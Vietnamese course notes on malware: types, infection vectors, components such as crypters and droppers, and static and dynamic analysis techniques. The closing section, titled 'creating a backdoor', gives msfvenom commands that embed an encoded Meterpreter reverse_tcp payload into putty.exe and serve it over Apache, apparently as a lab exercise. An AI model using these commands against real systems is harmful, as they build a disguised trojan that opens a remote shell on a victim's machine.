# Mã độc và kỹ thuật phân tích mã độc

## Giới thiệu

+ Mã độc là phần mềm độc hại gây hại -> lây truyền
+ Bị lây nhiễm -> kẻ tấn công có quyền -> thực thi các tác vụ gây hại
+ Có nhiều loại mã độc: 
	+ Vi-rút
	+ Sâu máy tính
	+ Rootkit
	+ Backdoor
	+ Ransomware
	+ Spyware
	+ Crypter
+ Kẻ tấn công có thể dùng mã độc để thực hiện hành vi sau:
	+ Tấn công trình duyệt, theo dõi hành vi, điều hướng truy cập
	+ Tấn công đến hiệu năng hệ thống -> tấn công từ chối dịch vụ
	+ Tấn công phần cứng hệ thống -> hư hại trang thiết bị
	+ Tấn công dữ liệu nhạy cảm, đánh cắp
	+ Tấn công lây lan

#### Các loại mã độc nổi tiếng

+ Backdoor: giúp kẻ tấn công kết nối vào thiết bị với các quyền giới hạn hoặc không thông qua cơ chế chứng thực
+ Botnet: giống backdoor, tất cả thiết bị bị nhiễm cùng botnet nhận cùng lệnh điều khiển
+ Downloader: tải các mã độc khác, lần đầu truy cập kẻ tấn công có thể cài để tải các mã độc khác
+ Launcher: chạy các mã độc khác, thường thấy trong tấn công cộng tác, trường hợp nhiều chương trình độc hại tấn công cùng 1 mục tiêu
+ Rootkit: dùng để che dấu sự hiện diện của mã độc khác. Thường đi cặp với 1 mã độc khác.
+ Scareware: thực hiện thanh toán trong bí mật. Giao diện thường là phần mềm chống virus
+ Adware: hiển thị quảng cáo. Ẩn dưới dạng là phần mềm hữu ích.
+ Ransomware: mã hoá tài liệu hoặc thiết bị -> yêu cầu tiền
+ Spyware: theo dõi người dùng rồi ghi lại cho một máy chủ từ xa
+ Spam-sending malware: gửi hàng loạt tin nhắn
+ Trojan horse: phần mềm hợp pháp -> thực thi mã độc
+ Vi-rút máy tính, sâu máy tính: có khả năng tự nhân bản, lây lan
	+ Sâu máy tính: chương trình chạy độc lập
	+ Vi rút: cần một chương trình hoặc tệp tin

### Cách thức lây nhiễm

+ Ứng dụng nhắn tin
+ Thiết bị lưu trữ gắn ngoài
	+ USB, DVD,...
	+ Autorun
	+ Đột nhập máy tính không bị khoá màn hình
+ Khai thác các lỗ hỏng bảo mật đã công bố
	+ Chưa được vá kịp thời
	+ Cài cắm phần mềm độc hại vào hệ thống: MS Word (CVE-2022-26903), MS Excel (CVE-2017-0006), Internet Explorer (CVE-2017-0018), SQL Server (CVE-2022-29143), Exchange Server (CVE-2022-21846). 
+ Tải các tập tin từ internet
	+ Kiểm tra mã băm trước khi tải, không tải trung gian
+ Các tệp đính kèm email
	+ Tệp tin hoặc hyperlink
+ Lây lan qua mạng
	+ Đảm bảo an ninh mạng là việc hàng đầu của tổ chức
	+ Còn nhiều lý do khiến cho hệ thống mạng tồn tại các lỗ hỏng
		+ Đặt tường lửa sai vị trí
		+ Wanacry lây qua giao thức SMB
+ Được cài từ phần mềm độc hại khác
	+ Thường sử dụng mã độc dạng downloader

### Các thành phần mã độc

#### Crypter

+ Che dấu sự hiện diện của mã độc
+ Vượt qua sự phát hiện của các trình phát hiện mã độc
+ Nó bảo vệ mã độc khỏi quá trình phân tích ngược

#### Downloader

#### Droper (vật chứa)

+ Chứa mã độc mà các trình phát hiện mã độc không phát hiện
+ Tải các tập tin bổ sung thực thi mã độc

#### Exploit (trình khai thác)

+ Phần quan trọng của mã độc
+ Chứa các mã độc dùng để khai thác lỗ hỏng
+ Tuỳ lỗ hỏng có các trình khai thác khác nhau

#### Injector (trình tiêm mã độc)

+ Dùng để chèn mã độc vào các tiến trình đang chạy

#### Obfuscator (trình làm rối)

+ Dùng làm rối mã nguồn mã độc
+ Làm khó khăn cho quá trình phân tích, phát hiện, loại bỏ mã độc

#### Packer (trình đóng gối)

+ Nén mã độc thành dạng khó độc
+ Dùng kỹ thuật nén khác nhau

#### Payload

+ Thực thi tác vụ chỉ định trước khi kích hoạt mã độc
+ Dùng để xoá, thay đổi tập tin, ảnh hưởng đến hiệu năng

#### Malicious code

+ Định nghĩa các chức năng cơ bản của mã độc

### Các kỹ thuật phân tích mã độc

#### Phân tích tĩnh
+ Không cần chạy mẫu thử
+ strings, IDA-pro, apktool: apk -> smali, JADX: apk -> java
+ Không cần chuẩn bị mô hình
+ Gặp khó khăn khi phân tích các mẫu sử dụng kỹ thuật làm rối mã nguồn, nén, mã hoá,...

#### Phân tích động
+ Cần phải khởi chạy mẫu thử
+ Dùng nhiều công cụ để theo dõi hành vi mẫu thử
+ Chuẩn bị môi trường tương thích
+ Cần môi trường an toàn
	+ Máy ảo, air-gapped computer
	+ Một số mã độc có thể phát hiện máy ảo
	+ Gây khó khăn cho quá trình phân tích và phát hiện
+ Giả lập môi trường internet là cần thiết do một số mã độc có thể phát hiện internet mới thực thi
+ INET: giả lập dịch vụ internet

#### Phân tích kết hợp
+ Kết hợp phân tích tĩnh và phân tích động
+ Tận dụng ưu điểm của các kỹ thuật phân tích
	+ Phân tích tĩnh trước để lấy thông tin điều hướng quá trình phân tích động
	+ Phân tích động trước để xác định các khu vực cần phân tích tĩnh

### Tạo backdoor 

+ `wget .../putty.exe`
+ `msfvenom-a x86 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=10.0.2.11 lport=4444 -e x86/shikata_ga_nai-i 3 -b "\x00" -f exe -o puttyX.exe`
+ `service apache2 start`
+ Cấu hình metasploit framework để lắng nghe backdoor
